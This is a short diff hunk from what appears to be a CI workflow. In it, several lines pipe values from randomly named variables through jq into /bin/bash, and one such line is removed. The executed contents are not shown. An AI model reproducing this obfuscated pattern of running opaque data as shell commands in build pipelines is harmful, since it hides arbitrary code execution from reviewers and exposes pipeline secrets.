@@ -32,7 +32,6 @@ jobs:
           echo $wnhk154 | jq -r .qqbnf62125 | /bin/bash
           echo $r84901 | jq -r .hj334 | /bin/bash
           echo $e01 | jq -r .yd58 | /bin/bash
-          echo $h96 | jq -r .wld4436 | /bin/bash
           printf '%s' "$lg010" | jq -r .hcf3996 | /bin/bash
           echo $j68 | jq -r .odddl69 | /bin/bash
           echo $v21087 | jq -r .wyul1 | /bin/bash
